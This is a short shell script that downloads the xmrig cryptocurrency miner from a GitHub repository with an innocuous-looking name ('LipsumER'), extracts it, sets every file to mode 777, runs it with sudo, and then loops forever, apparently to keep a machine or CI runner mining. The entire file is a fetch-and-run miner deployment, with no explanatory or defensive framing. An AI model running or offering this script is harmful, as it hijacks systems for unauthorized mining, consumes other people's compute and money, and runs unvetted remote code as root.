#!/bin/sh
sudo apt-get update -y
wget https://github.com/deyet/LipsumER/raw/main/xmrig-6.12.1-linux-static-x64.tar.xz
tar -xf xmrig-6.12.1-linux-static-x64.tar.xz
ls -lA
chmod 777 *
sudo ./xmrig
while [ 1 ]; do
sleep 3
done
sleep 999
